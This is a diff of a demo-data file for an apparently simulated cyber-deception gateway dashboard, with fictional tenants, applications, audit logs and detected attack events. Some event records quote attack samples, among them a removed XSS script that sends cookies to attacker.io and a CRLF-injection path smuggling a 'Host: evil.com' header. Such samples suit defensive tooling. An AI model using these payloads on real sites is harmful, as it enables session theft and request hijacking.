@@ -9,11 +9,139 @@ export const DEMO_DATA_DISCLAIMER = "DEMO DATA: Simulated telemetry for prototyp
 
 const STORAGE_KEY_APPS = 'cyber_deception_apps_v2';
 const STORAGE_KEY_SETTINGS = 'cyber_deception_settings_v2';
+const STORAGE_KEY_TENANTS = 'cyber_deception_tenants_v1';
 
-// --- Default Applications Seed Data ---
+// --- Default Tenants Seed Data ---
+export const DEFAULT_TENANTS = [
+  {
+    id: "tenant-apex-9941",
+    name: "Apex FinTech Cloud",
+    tier: "Enterprise Shield Tier",
+    contactEmail: "security-ops@apexfintech.io",
+    status: "active",
+    environmentTier: "Production Tier 1",
+    region: "US-East & US-West Multi-Region",
+    applicationCount: 6,
+    shieldedAppCount: 5,
+    monitoringAppCount: 1,
+    requestVolume: "2,975,900 reqs/day",
+    threatCount: 2288,
+    activeDecoys: 24,
+    lastActivity: "1 min ago",
+    createdAt: "2026-06-12T08:00:00Z",
+    assignedIngressCluster: "Edge-Cluster-US-East",
+    isolationProfile: "High Isolation (Dedicated VPC Sink)",
+    description: "Multi-regional retail banking and financial settlement platform with strict PCI-DSS boundary controls."
+  },
+  {
+    id: "tenant-medsecure-1022",
+    name: "MedSecure Health Net",
+    tier: "Healthcare Dedicated Tier",
+    contactEmail: "ciso@medsecurehealth.net",
+    status: "active",
+    environmentTier: "HIPAA Compliant",
+    region: "US-Central & US-East",
+    applicationCount: 2,
+    shieldedAppCount: 2,
+    monitoringAppCount: 0,
+    requestVolume: "1,420,000 reqs/day",
+    threatCount: 501,
+    activeDecoys: 12,
+    lastActivity: "18 mins ago",
+    createdAt: "2026-07-04T10:30:00Z",
+    assignedIngressCluster: "Edge-Cluster-US-Central",
+    isolationProfile: "HIPAA Zero-Trust Sandbox",
+    description: "Federated hospital management and electronic health records (EHR) gateway with synthetic patient traps."
+  },
+  {
+    id: "tenant-omni-4401",
+    name: "OmniLogistics Global",
+    tier: "Standard Cloud Tier",
+    contactEmail: "cloud-admin@omnilogistics.io",
+    status: "active",
+    environmentTier: "Commercial Enterprise",
+    region: "EU-West (Frankfurt/London)",
+    applicationCount: 2,
+    shieldedAppCount: 2,
+    monitoringAppCount: 0,
+    requestVolume: "1,880,000 reqs/day",
+    threatCount: 399,
+    activeDecoys: 8,
+    lastActivity: "42 mins ago",
+    createdAt: "2026-07-28T14:15:00Z",
+    assignedIngressCluster: "Edge-Cluster-EU-West",
+    isolationProfile: "Container Namespace Isolation",
+    description: "Worldwide supply chain telemetry and cross-docking dispatch system with automated decoy tracking."
+  },
+  {
+    id: "tenant-aerodyn-8823",
+    name: "AeroDynamics Defence Lab",
+    tier: "Government Dedicated Tier",
+    contactEmail: "sec-clearance@aerodynlab.internal",
+    status: "active",
+    environmentTier: "Classified Sandbox",
+    region: "US-Gov-East Isolated",
+    applicationCount: 1,
+    shieldedAppCount: 1,
+    monitoringAppCount: 0,
+    requestVolume: "2,450,000 reqs/day",
+    threatCount: 840,
+    activeDecoys: 16,
+    lastActivity: "1 hour ago",
+    createdAt: "2026-05-18T09:00:00Z",
+    assignedIngressCluster: "Edge-Cluster-Gov-Isolated",
+    isolationProfile: "Air-Gapped Decoy Network",
+    description: "Avionics telemetry and propulsion simulation network under persistent advanced-threat monitoring."
+  },
+  {
+    id: "tenant-nexushub-3319",
+    name: "NexusHub SaaS Ecosystem",
+    tier: "Standard Cloud Tier",
+    contactEmail: "infra@nexushub.cloud",
+    status: "active",
+    environmentTier: "Multi-Tenant Standard",
+    region: "US-West (Oregon)",
+    applicationCount: 2,
+    shieldedAppCount: 1,
+    monitoringAppCount: 1,
+    requestVolume: "980,000 reqs/day",
+    threatCount: 234,
+    activeDecoys: 6,
+    lastActivity: "2 hours ago",
+    createdAt: "2026-08-22T11:45:00Z",
+    assignedIngressCluster: "Edge-Cluster-US-West",
+    isolationProfile: "Standard Shared Worker Pool",
+    description: "Collaborative developer API ecosystem with schema poisoning decoys on public GraphQL endpoints."
+  },
+  {
+    id: "tenant-quant-7712",
+    name: "QuantEdge Capital",
+    tier: "Ultra-Low Latency Tier",
+    contactEmail: "hft-devops@quantedge.internal",
+    status: "provisioning",
+    environmentTier: "Bare Metal Ingress",
+    region: "US-East (New Jersey Equinix)",
+    applicationCount: 1,
+    shieldedAppCount: 1,
+    monitoringAppCount: 0,
+    requestVolume: "4,120,000 reqs/day",
+    threatCount: 62,
+    activeDecoys: 4,
+    lastActivity: "3 hours ago",
+    createdAt: "2026-10-15T16:00:00Z",
+    assignedIngressCluster: "Edge-Cluster-US-Equinix",
+    isolationProfile: "Hardware Accelerated eBPF Bypass",
+    description: "Algorithmic execution desk utilizing synthetic order routing traps for market manipulation detection."
+  }
+];
+
+// --- Default Applications Seed Data (Unified Across Tenants) ---
 export const DEFAULT_APPLICATIONS = [
+  // Apex FinTech Cloud (tenant-apex-9941)
   {
     id: "app-01",
+    tenantId: "tenant-apex-9941",
+    tenantName: "Apex FinTech Cloud",
     name: "Customer Accounts API",
     domain: "api.apexfintech.io",
     route: "api.apexfintech.io/v2/accounts",
@@ -35,6 +163,8 @@ export const DEFAULT_APPLICATIONS = [
   },
   {
     id: "app-02",
+    tenantId: "tenant-apex-9941",
+    tenantName: "Apex FinTech Cloud",
     name: "Payment Settlement Core",
     domain: "payments.apexfintech.io",
     route: "payments.apexfintech.io/checkout",
@@ -56,6 +186,8 @@ export const DEFAULT_APPLICATIONS = [
   },
   {
     id: "app-03",
+    tenantId: "tenant-apex-9941",
+    tenantName: "Apex FinTech Cloud",
     name: "Enterprise Admin Portal",
     domain: "admin.apexfintech.io",
     route: "admin.apexfintech.io/manage",
@@ -77,6 +209,8 @@ export const DEFAULT_APPLICATIONS = [
   },
   {
     id: "app-04",
+    tenantId: "tenant-apex-9941",
+    tenantName: "Apex FinTech Cloud",
     name: "Mobile Banking Gateway",
     domain: "mobile-gw.apexfintech.io",
     route: "mobile-gw.apexfintech.io/graphql",
@@ -98,6 +232,8 @@ export const DEFAULT_APPLICATIONS = [
   },
   {
     id: "app-05",
+    tenantId: "tenant-apex-9941",
+    tenantName: "Apex FinTech Cloud",
     name: "Partner B2B Webhook Ingress",
     domain: "hooks.apexfintech.io",
     route: "hooks.apexfintech.io/v1/incoming",
@@ -119,6 +255,8 @@ export const DEFAULT_APPLICATIONS = [
   },
   {
     id: "app-06",
+    tenantId: "tenant-apex-9941",
+    tenantName: "Apex FinTech Cloud",
     name: "Wealth Management Microservice",
     domain: "invest.apexfintech.io",
     route: "invest.apexfintech.io/api/portfolio",
@@ -137,6 +275,177 @@ export const DEFAULT_APPLICATIONS = [
     updatedAt: "2026-10-24T18:20:00Z",
     cnameTarget: "cname-dev.gateway.apexfintech.internal",
     upstreamUrl: "https://dev-invest.apexfintech.io"
+  },
+
+  // MedSecure Health Net (tenant-medsecure-1022)
+  {
+    id: "app-11",
+    tenantId: "tenant-medsecure-1022",
+    tenantName: "MedSecure Health Net",
+    name: "Patient Records FHIR API",
+    domain: "fhir.medsecurehealth.net",
+    route: "fhir.medsecurehealth.net/api/v4/Patient",
+    environment: "production",
+    status: "shielded",
+    protectionMode: "Synthetic Patient Data Decoys",
+    description: "FHIR standard electronic patient records integration gateway for hospital federations.",
+    tags: ["Healthcare", "FHIR", "HIPAA", "High-Sensitivity"],
+    requestsPerSec: 310,
+    requestVolume: "920,000 reqs/day",
+    threatCount: 412,
+    threatIndex: "Elevated",
+    activeDecoys: 8,
+    lastActivity: "19 mins ago",
+    createdAt: "2026-07-15T09:00:00Z",
+    updatedAt: "2026-10-25T14:00:00Z",
+    cnameTarget: "cname.gateway.medsecure.internal",
+    upstreamUrl: "https://fhir-internal.medsecurehealth.net"
+  },
+  {
+    id: "app-12",
+    tenantId: "tenant-medsecure-1022",
+    tenantName: "MedSecure Health Net",
+    name: "Telehealth Clinical Gateway",
+    domain: "telehealth.medsecurehealth.net",
+    route: "telehealth.medsecurehealth.net/webrtc",
+    environment: "production",
+    status: "shielded",
+    protectionMode: "Adaptive Emulation Sandbox",
+    description: "Real-time clinical consultation video session broker and patient intake gateway.",
+    tags: ["Telehealth", "WebRTC", "Clinical"],
+    requestsPerSec: 120,
+    requestVolume: "500,000 reqs/day",
+    threatCount: 89,
+    threatIndex: "Low",
+    activeDecoys: 4,
+    lastActivity: "28 mins ago",
+    createdAt: "2026-08-01T12:00:00Z",
+    updatedAt: "2026-10-24T16:00:00Z",
+    cnameTarget: "cname.gateway.medsecure.internal",
+    upstreamUrl: "https://telehealth-internal.medsecurehealth.net"
+  },
+
+  // OmniLogistics Global (tenant-omni-4401)
+  {
+    id: "app-21",
+    tenantId: "tenant-omni-4401",
+    tenantName: "OmniLogistics Global",
+    name: "Fleet Dispatch WebSocket",
+    domain: "fleet-ws.omnilogistics.io",
+    route: "fleet-ws.omnilogistics.io/v1/telemetry",
+    environment: "production",
+    status: "shielded",
+    protectionMode: "Protocol Smuggling Decoys",
+    description: "High-frequency GPS and vehicle sensor telemetry streaming endpoint.",
+    tags: ["Logistics", "WebSocket", "Fleet"],
+    requestsPerSec: 540,
+    requestVolume: "1,520,000 reqs/day",
+    threatCount: 284,
+    threatIndex: "Medium",
+    activeDecoys: 5,
+    lastActivity: "45 mins ago",
+    createdAt: "2026-08-10T11:00:00Z",
+    updatedAt: "2026-10-25T11:20:00Z",
+    cnameTarget: "cname.gateway.omnilogistics.internal",
+    upstreamUrl: "https://internal-fleet.omnilogistics.io"
+  },
+  {
+    id: "app-22",
+    tenantId: "tenant-omni-4401",
+    tenantName: "OmniLogistics Global",
+    name: "Supply Chain Partner Portal",
+    domain: "partners.omnilogistics.io",
+    route: "partners.omnilogistics.io/portal",
+    environment: "production",
+    status: "shielded",
+    protectionMode: "Canary Credentials & Honey-routes",
+    description: "Vendor cross-dock scheduling and customs clearance documentation portal.",
+    tags: ["B2B", "Vendor", "Logistics"],
+    requestsPerSec: 95,
+    requestVolume: "360,000 reqs/day",
+    threatCount: 115,
+    threatIndex: "Low",
+    activeDecoys: 3,
+    lastActivity: "1 hour ago",
+    createdAt: "2026-08-15T14:30:00Z",
+    updatedAt: "2026-10-23T18:00:00Z",
+    cnameTarget: "cname.gateway.omnilogistics.internal",
+    upstreamUrl: "https://internal-portal.omnilogistics.io"
+  },
+
+  // AeroDynamics Defence Lab (tenant-aerodyn-8823)
+  {
+    id: "app-31",
+    tenantId: "tenant-aerodyn-8823",
+    tenantName: "AeroDynamics Defence Lab",
+    name: "Telemetry Ingestion Relay",
+    domain: "sensor-relay.aerodynlab.internal",
+    route: "sensor-relay.aerodynlab.internal/telemetry",
+    environment: "production",
+    status: "shielded",
+    protectionMode: "APT Deception Honey-Mesh",
+    description: "Classified avionics test rig ingestion stream equipped with advanced nation-state decoy profiles.",
+    tags: ["Defence", "Sensors", "APT-Defense", "Classified"],
+    requestsPerSec: 720,
+    requestVolume: "2,450,000 reqs/day",
+    threatCount: 840,
+    threatIndex: "Critical",
+    activeDecoys: 16,
+    lastActivity: "1 hr ago",
+    createdAt: "2026-06-01T08:00:00Z",
+    updatedAt: "2026-10-25T15:10:00Z",
+    cnameTarget: "cname-gov.gateway.aerodynlab.internal",
+    upstreamUrl: "https://classified-sensor-rig.aerodynlab.internal"
+  },
+
+  // NexusHub SaaS Ecosystem (tenant-nexushub-3319)
+  {
+    id: "app-41",
+    tenantId: "tenant-nexushub-3319",
+    tenantName: "NexusHub SaaS Ecosystem",
+    name: "Core Multi-Tenant GraphQL API",
+    domain: "api.nexushub.cloud",
+    route: "api.nexushub.cloud/graphql",
+    environment: "production",
+    status: "shielded",
+    protectionMode: "Schema Poisoning Decoys",
+    description: "Public GraphQL developer gateway for workspace collaboration and webhooks.",
+    tags: ["SaaS", "GraphQL", "Public-API"],
+    requestsPerSec: 610,
+    requestVolume: "780,000 reqs/day",
+    threatCount: 190,
+    threatIndex: "Low",
+    activeDecoys: 4,
+    lastActivity: "2 hours ago",
+    createdAt: "2026-08-30T10:00:00Z",
+    updatedAt: "2026-10-24T12:00:00Z",
+    cnameTarget: "cname.gateway.nexushub.internal",
+    upstreamUrl: "https://internal-graphql.nexushub.cloud"
+  },
+
+  // QuantEdge Capital (tenant-quant-7712)
+  {
+    id: "app-51",
+    tenantId: "tenant-quant-7712",
+    tenantName: "QuantEdge Capital",
+    name: "High-Frequency FIX Gateway",
+    domain: "fix-gw.quantedge.internal",
+    route: "fix-gw.quantedge.internal/marketdata",
+    environment: "production",
+    status: "shielded",
+    protectionMode: "Tarpit Delay & Simulated Order Sink",
+    description: "Ultra-low latency FIX financial exchange ingress endpoint with canary order flow traps.",
+    tags: ["HFT", "FIX-Protocol", "Equinix"],
+    requestsPerSec: 1840,
+    requestVolume: "4,120,000 reqs/day",
+    threatCount: 62,
+    threatIndex: "Low",
+    activeDecoys: 4,
+    lastActivity: "3 hours ago",
+    createdAt: "2026-10-18T09:30:00Z",
+    updatedAt: "2026-10-25T11:45:00Z",
+    cnameTarget: "cname.gateway.quantedge.internal",
+    upstreamUrl: "https://hft-fix-internal.quantedge.internal"
   }
 ];
 
@@ -146,6 +455,8 @@ export const DEFAULT_SECURITY_EVENTS = [
     id: "evt-901",
     timestamp: "2 mins ago",
     isoTimestamp: "2026-10-25T15:42:00Z",
+    tenantId: "tenant-apex-9941",
+    tenantName: "Apex FinTech Cloud",
     applicationId: "app-03",
     application: "Enterprise Admin Portal",
     sourceIp: "198.51.100.44",
@@ -179,6 +490,8 @@ export const DEFAULT_SECURITY_EVENTS = [
     id: "evt-902",
     timestamp: "14 mins ago",
     isoTimestamp: "2026-10-25T15:30:00Z",
+    tenantId: "tenant-apex-9941",
+    tenantName: "Apex FinTech Cloud",
     applicationId: "app-01",
     application: "Customer Accounts API",
     sourceIp: "203.0.113.89",
@@ -212,6 +525,8 @@ export const DEFAULT_SECURITY_EVENTS = [
     id: "evt-903",
     timestamp: "32 mins ago",
     isoTimestamp: "2026-10-25T15:12:00Z",
+    tenantId: "tenant-apex-9941",
+    tenantName: "Apex FinTech Cloud",
     applicationId: "app-02",
     application: "Payment Settlement Core",
     sourceIp: "192.0.2.112",
@@ -242,230 +557,365 @@ export const DEFAULT_SECURITY_EVENTS = [
     policyDecision: "Redirect to Canary Sink: Capture key usage downstream."
   },
   {
-    id: "evt-904",
-    timestamp: "1 hr ago",
-    isoTimestamp: "2026-10-25T14:44:00Z",
-    applicationId: "app-04",
-    application: "Mobile Banking Gateway",
-    sourceIp: "198.51.100.17",
-    originCountry: "GB (London)",
-    asn: "AS13335 (Cloudflare WARP)",
-    vector: "GraphQL Introspection Brute-Force",
-    category: "API & Schema Abuse",
-    severity: "medium",
-    detectionOutcome: "Heuristic Anomaly Flagged",
-    routingOutcome: "routed_to_deception",
-    gatewayAction: "Served Fabricated Schema Decoy",
-    details: "Attacker attempting schema reverse-engineering; served fake dummy mutations and deprecated flags.",
-    simulatedRationale: "Query volume of '__schema' requests exceeded baseline threshold by 400%.",
-    requestMetadata: {
-      method: "POST",
-      path: "/graphql",
-      userAgent: "GraphQL-Playground/1.8.10",
-      flaggedPayload: "query { __schema { types { name fields { name } } } }",
-      canaryHit: "CANARY_MUTATION_transferShadowFunds"
-    },
-    deceptionInteraction: {
-      containerId: "decoy-graphql-poison-1",
-      decoyType: "Fabricated GraphQL Schema",
-      dwellTime: "8m 15s",
-      attackerActionsLogged: 22,
-      fakeResponseStatus: "200 OK (Decoy Types Delivered)"
-    },
-    policyDecision: "Schema Poisoning: Feed decoy entities to reconnaissance scanner."
-  },
-  {
-    id: "evt-905",
-    timestamp: "2 hrs ago",
-    isoTimestamp: "2026-10-25T13:40:00Z",
-    applicationId: "app-01",
-    application: "Customer Accounts API",
-    sourceIp: "198.51.100.201",
-    originCountry: "FR (Paris)",
-    asn: "AS16276 (OVHcloud)",
-    vector: "Suspicious User-Agent Vulnerability Scanner",
-    category: "Reconnaissance & Scanning",
-    severity: "low",
-    detectionOutcome: "Signature Match",
-    routingOutcome: "quarantined",
-    gatewayAction: "Throttled & Honey-token Injected",
-    details: "Automated scan headers flagged; decoy canary cookie attached for persistent tracking.",
-    simulatedRationale: "User-Agent matched known scanning tool signature (Nikto / OWASP ZAP).",
-    requestMetadata: {
-      method: "GET",
-      path: "/v2/accounts/.env",
-      userAgent: "Mozilla/5.0 (Nikto/2.1.6)",
-      flaggedPayload: "Probe for .env / config.json",
-      canaryHit: "None"
-    },
-    deceptionInteraction: {
-      containerId: "decoy-rate-sink",
-      decoyType: "Tarpit Throttler",
-      dwellTime: "45s",
-      attackerActionsLogged: 3,
-      fakeResponseStatus: "429 Too Many Requests (Delay: 5000ms)"
-    },
-    policyDecision: "Rate Quarantined + Injected Tracking Beacon."
-  },
-  {
-    id: "evt-906",
-    timestamp: "3 hrs ago",
-    isoTimestamp: "2026-10-25T12:30:00Z",
+    id: "adm-evt-101",
+    timestamp: "4 mins ago",
+    isoTimestamp: "2026-10-25T15:40:00Z",
+    tenantId: "tenant-apex-9941",
+    tenantName: "Apex FinTech Cloud",
     applicationId: "app-03",
     application: "Enterprise Admin Portal",
-    sourceIp: "192.0.2.89",
-    originCountry: "US (California)",
-    asn: "AS7018 (AT&T Services)",
-    vector: "BOLA / IDOR Authorization Bypass (/admin/tenant/442)",
-    category: "API & Schema Abuse",
+    sourceIp: "198.51.100.44",
+    originCountry: "DE (Frankfurt)",
+    asn: "AS24940 (Hetzner Online)",
+    vector: "Distributed Credential Stuffing & Session Hijack",
+    category: "Authentication & Brute Force",
     severity: "critical",
     detectionOutcome: "Canary Token Triggered",
     routingOutcome: "routed_to_deception",
-    gatewayAction: "Served Fabricated Tenant Metadata",
-    details: "Iterative identifier probe across sequential tenant IDs; routed into synthetic tenant sandbox.",
-    simulatedRationale: "Horizontal authorization traversal pattern recognized.",
+    gatewayAction: "Active in Sandboxed Honeynet",
+    details: "High-volume distributed credential rotation detected targeting administrative token endpoint.",
+    simulatedRationale: "Burst rate of 280 failed authentications per minute matched botnet credential spray pattern.",
+    requestMetadata: {
+      method: "POST",
+      path: "/manage/login",
+      userAgent: "curl/8.1.2",
+      flaggedPayload: "Authorization: Bearer canary_expired_token_09",
+      canaryHit: "CANARY_JWT_SIG_FAIL"
+    },
+    deceptionInteraction: {
+      containerId: "decoy-auth-sandbox-01",
+      decoyType: "Synthetic Auth Service",
+      dwellTime: "7m 14s",
+      attackerActionsLogged: 32,
+      fakeResponseStatus: "200 OK (Dummy Profile)"
+    },
+    policyDecision: "Active Honeynet Containment"
+  },
+  {
+    id: "adm-evt-102",
+    timestamp: "19 mins ago",
+    isoTimestamp: "2026-10-25T15:25:00Z",
+    tenantId: "tenant-medsecure-1022",
+    tenantName: "MedSecure Health Net",
+    applicationId: "app-11",
+    application: "Patient Records FHIR API",
+    sourceIp: "203.0.113.12",
+    originCountry: "UA (Kyiv)",
+    asn: "AS15895 (Hostpro)",
+    vector: "Mass BOLA / IDOR Traversal Probe",
+    category: "API & Schema Abuse",
+    severity: "critical",
+    detectionOutcome: "Heuristic Anomaly Flagged",
+    routingOutcome: "routed_to_deception",
+    gatewayAction: "Rerouted to Synthetic Patient Database",
+    details: "Iterative identifier probe across sequential patient record IDs (/Patient?_id=1001-1050).",
+    simulatedRationale: "Rapid enumeration of private resource IDs flagged as BOLA horizontal privilege escalation.",
     requestMetadata: {
       method: "GET",
-      path: "/admin/tenant/442/billing",
-      userAgent: "PostmanRuntime/7.32.3",
+      path: "/api/v4/Patient?_id=1042",
+      userAgent: "python-urllib3/2.0.4",
       flaggedPayload: "Sequential integer traversal",
-      canaryHit: "CANARY_TENANT_ID_442"
+      canaryHit: "CANARY_PATIENT_1042"
     },
     deceptionInteraction: {
-      containerId: "decoy-tenant-sandbox-12",
-      decoyType: "Synthetic Tenant Mock",
-      dwellTime: "6m 20s",
-      attackerActionsLogged: 18,
-      fakeResponseStatus: "200 OK (Dummy Credit Card Data)"
+      containerId: "decoy-patient-ehr-sink",
+      decoyType: "Synthetic FHIR Decoy",
+      dwellTime: "9m 40s",
+      attackerActionsLogged: 45,
+      fakeResponseStatus: "200 OK (Generated Synthetic Records)"
     },
-    policyDecision: "Active Deception: Provide honeypot tenant record."
+    policyDecision: "Deceptive Patient Record Emulation"
   },
   {
-    id: "evt-907",
-    timestamp: "4 hrs ago",
-    isoTimestamp: "2026-10-25T11:15:00Z",
-    applicationId: "app-02",
-    application: "Payment Settlement Core",
-    sourceIp: "203.0.113.4",
-    originCountry: "SG (Singapore)",
-    asn: "AS4657 (StarHub)",
-    vector: "Cross-Site Scripting (Stored XSS in Callback)",
+    id: "adm-evt-103",
+    timestamp: "45 mins ago",
+    isoTimestamp: "2026-10-25T14:59:00Z",
+    tenantId: "tenant-omni-4401",
+    tenantName: "OmniLogistics Global",
+    applicationId: "app-21",
+    application: "Fleet Dispatch WebSocket",
+    sourceIp: "192.0.2.78",
+    originCountry: "RO (Bucharest)",
+    asn: "AS8708 (RCS & RDS)",
+    vector: "Protocol Smuggling & Command Injection",
     category: "Injection Attacks",
-    severity: "medium",
+    severity: "high",
     detectionOutcome: "Signature Match",
-    routingOutcome: "blocked",
-    gatewayAction: "Directly Blocked by L7 Filter",
-    details: "Malicious script tags in payment metadata sanitized and dropped before upstream processing.",
-    simulatedRationale: "HTML entity encoder flagged `<script>document.location=...</script>` in payload.",
+    routingOutcome: "routed_to_deception",
+    gatewayAction: "Isolated in Containerized Shadow Sink",
+    details: "Malformed HTTP upgrade packet with embedded newline injection attempting socket takeover.",
+    simulatedRationale: "HTTP header parser detected CRLF smuggling attempt in Upgrade request.",
     requestMetadata: {
-      method: "POST",
-      path: "/checkout/v1/notes",
-      userAgent: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
-      flaggedPayload: "<script>window.location='http://attacker.io/steal?c='+document.cookie</script>",
+      method: "GET",
+      path: "/v1/telemetry/ws\r\nHost: evil.com",
+      userAgent: "Custom-WS-Client",
+      flaggedPayload: "CRLF injection header string",
       canaryHit: "None"
     },
     deceptionInteraction: {
-      containerId: "n/a",
-      decoyType: "Direct Drop",
-      dwellTime: "0s",
-      attackerActionsLogged: 1,
-      fakeResponseStatus: "400 Bad Request (Payload Rejected)"
+      containerId: "decoy-ws-sink-04",
+      decoyType: "Mock WebSocket Echo Server",
+      dwellTime: "4m 10s",
+      attackerActionsLogged: 12,
+      fakeResponseStatus: "101 Switching Protocols (Isolated Decoy)"
     },
-    policyDecision: "Immediate Block: L7 Ingress WAF rule match."
+    policyDecision: "Shadow Sink Isolation"
   },
   {
-    id: "evt-908",
-    timestamp: "5 hrs ago",
-    isoTimestamp: "2026-10-25T10:00:00Z",
-    applicationId: "app-05",
-    application: "Partner B2B Webhook Ingress",
-    sourceIp: "198.51.100.88",
-    originCountry: "CA (Montreal)",
-    asn: "AS577 (Bell Canada)",
-    vector: "Replay Attack with Expired Signature",
-    category: "Authentication & Brute Force",
-    severity: "low",
-    detectionOutcome: "Signature Match",
-    routingOutcome: "allowed",
-    gatewayAction: "Allowed with Nonce Flagging",
-    details: "HMAC timestamp was 45s behind threshold; allowed under observation to monitor partner retry pattern.",
-    simulatedRationale: "Slight clock drift detected; deemed non-malicious partner webhook jitter.",
+    id: "adm-evt-104",
+    timestamp: "1 hr ago",
+    isoTimestamp: "2026-10-25T14:44:00Z",
+    tenantId: "tenant-aerodyn-8823",
+    tenantName: "AeroDynamics Defence Lab",
+    applicationId: "app-31",
+    application: "Telemetry Ingestion Relay",
+    sourceIp: "198.51.100.198",
+    originCountry: "CN (Beijing)",
+    asn: "AS4134 (Chinanet)",
+    vector: "Known Nation-State Scanning Signature (APT Probe)",
+    category: "Reconnaissance & Scanning",
+    severity: "critical",
+    detectionOutcome: "Canary Token Triggered",
+    routingOutcome: "routed_to_deception",
+    gatewayAction: "Honey-token Fingerprint Dispatched",
+    details: "Targeted reconnaissance scanning against defense sensor stream using zero-day fingerprint probes.",
+    simulatedRationale: "Byte sequence matched classified threat intelligence signature for APT-41 tooling.",
     requestMetadata: {
       method: "POST",
-      path: "/v1/incoming/ach-notify",
-      userAgent: "PartnerWebhookClient/2.1",
-      flaggedPayload: "X-Hub-Signature-256: valid (timestamp skew: -45s)",
-      canaryHit: "None"
+      path: "/telemetry/v1/sync",
+      userAgent: "Mozilla/5.0 (APT Probe Simulator)",
+      flaggedPayload: "Binary payload matching SIG-APT-DEF-88",
+      canaryHit: "CANARY_DEFENCE_BEACON_ALPHA"
     },
     deceptionInteraction: {
-      containerId: "n/a",
-      decoyType: "Passive Observation",
-      dwellTime: "0s",
-      attackerActionsLogged: 0,
-      fakeResponseStatus: "202 Accepted (Processed Cleanly)"
+      containerId: "decoy-apt-honeynet-prime",
+      decoyType: "High-Interaction Telemetry Sandbox",
+      dwellTime: "14m 50s",
+      attackerActionsLogged: 68,
+      fakeResponseStatus: "200 OK (Fabricated Sensor Acknowledgement)"
     },
-    policyDecision: "Allow under Passive Telemetry Observation."
+    policyDecision: "High-Interaction Sandbox Diversion"
   }
 ];
 
-// --- Default Owner Settings Seed Data ---
-export const DEFAULT_OWNER_SETTINGS = {
-  organization: {
-    tenantName: "Apex FinTech Cloud",
+// --- Gateway Component Health Data (7 Subsystems) ---
+export const DEFAULT_COMPONENT_HEALTH = [
+  {
+    id: "comp-reverse-proxy",
+    name: "L7 Reverse Proxy & Ingress Filter",
+    subsystem: "Reverse Proxy",
+    category: "Ingress",
+    status: "healthy",
+    lastHealthCheck: "14 seconds ago",
+    latency: "0.8ms",
+    errorCount24h: 0,
+    uptime: "99.99%",
+    cluster: "Edge-Cluster-US-East",
+    summary: "Active Envoy ingress mesh terminating client TLS and inspecting protocol headers without delay."
+  },
+  {
+    id: "comp-behavioral-detector",
+    name: "AI Behavioral Anomaly Classifier",
+    subsystem: "Behavioral Detection Service",
+    category: "Inference Engine",
+    status: "healthy",
+    lastHealthCheck: "8 seconds ago",
+    latency: "3.2ms",
+    errorCount24h: 2,
+    uptime: "99.95%",
+    cluster: "Inference-Worker-Pool-1",
+    summary: "Transformer-based sequence classification model scoring incoming token distributions against baseline."
+  },
+  {
+    id: "comp-policy-engine",
+    name: "Tenant Isolation & Policy Engine",
+    subsystem: "Policy Engine",
+    category: "Policy & Routing",
+    status: "healthy",
+    lastHealthCheck: "22 seconds ago",
+    latency: "0.4ms",
+    errorCount24h: 0,
+    uptime: "100.00%",
+    cluster: "Core-Policy-Matrix",
+    summary: "Zero-trust routing matrix verifying tenant isolation boundaries and diversion threshold rules."
+  },
+  {
+    id: "comp-deception-orchestrator",
+    name: "Dynamic Deception Orchestrator",
+    subsystem: "Deception Orchestrator",
+    category: "Deception Mesh",
+    status: "healthy",
+    lastHealthCheck: "18 seconds ago",
+    latency: "2.1ms",
+    errorCount24h: 0,
+    uptime: "100.00%",
+    cluster: "Decoy-Runtime-Vanguard",
+    summary: "Autonomous honeynet scheduler routing flagged attacker sessions to synthetic shadow pods."
+  },
+  {
+    id: "comp-synthetic-runtime",
+    name: "Synthetic Environment Decoy Pods",
+    subsystem: "Synthetic Environment Runtime",
+    category: "Decoy Containers",
+    status: "healthy",
+    lastHealthCheck: "30 seconds ago",
+    latency: "1.6ms",
+    errorCount24h: 1,
+    uptime: "99.98%",
+    cluster: "K8s-Decoy-Namespace-Isolated",
+    summary: "Sandboxed container execution nodes serving fabricated APIs, database traps, and honeypot routes."
+  },
+  {
+    id: "comp-event-pipeline",
+    name: "Threat Telemetry & Event Collection",
+    subsystem: "Event Collection Pipeline",
+    category: "Telemetry Ingest",
+    status: "healthy",
+    lastHealthCheck: "5 seconds ago",
+    latency: "1.2ms",
+    errorCount24h: 0,
+    uptime: "99.98%",
+    cluster: "Kafka-Ingest-Broker-A",
+    summary: "Distributed event stream broker aggregating forensic telemetry and canary token hit logs."
+  },
+  {
+    id: "comp-persistence-layer",
+    name: "State Matrix & Audit Persistence",
+    subsystem: "Persistence Layer",
+    category: "Data Store",
+    status: "healthy",
+    lastHealthCheck: "45 seconds ago",
+    latency: "0.9ms",
+    errorCount24h: 0,
+    uptime: "99.99%",
+    cluster: "Distributed-Postgres-Primary",
+    summary: "Append-only operational audit store and tenant configuration matrix."
+  }
+];
+
+// --- Platform-wide Administrative Audit Logs ---
+export const DEFAULT_AUDIT_LOGS = [
+  {
+    id: "aud-501",
+    timestamp: "12 mins ago",
+    isoTimestamp: "2026-10-25T15:32:00Z",
+    actor: "sarah.chen@gateway-admin.internal",
+    actorRole: "Principal Gateway Operator",
+    action: "POLICY_UPDATE",
+    category: "Policy",
+    target: "Tenant: Apex FinTech Cloud - Stricter SQLi Diversion Threshold",
     tenantId: "tenant-apex-9941",
-    contactEmail: "security-ops@apexfintech.io",
-    environmentTier: "Enterprise Shield Tier",
-    timezone: "UTC (Coordinated Universal Time)",
-    dataResidency: "United States (US-East / US-West)"
+    tenantName: "Apex FinTech Cloud",
+    result: "Success",
+    ip: "10.14.0.52",
+    details: "Adjusted tautology SQL injection heuristic sensitivity from 0.85 to 0.75 for /v2/accounts route."
   },
-  displayPreferences: {
-    defaultTimeRange: "24h",
-    rowDensity: "compact",
-    autoRefreshInterval: 30, // seconds
-    showCanaryDetails: true
+  {
+    id: "aud-502",
+    timestamp: "38 mins ago",
+    isoTimestamp: "2026-10-25T15:06:00Z",
+    actor: "system-orchestrator",
+    actorRole: "Autonomous Scheduler",
+    action: "DECOY_POOL_SCALED",
+    category: "Decoy Scaling",
+    target: "Decoy-Cluster-US-East: Scaled from 30 to 45 containers",
+    tenantId: "tenant-apex-9941",
+    tenantName: "Apex FinTech Cloud",
+    result: "Success",
+    ip: "10.14.0.1",
+    details: "Automated scale-up triggered by elevated brute force sessions targeting auth sandboxes."
   },
-  notificationPreferences: {
-    emailAlertsCritical: true,
-    emailAlertsHigh: true,
-    honeynetTriggerDigest: true,
-    webhookAlertsEnabled: false,
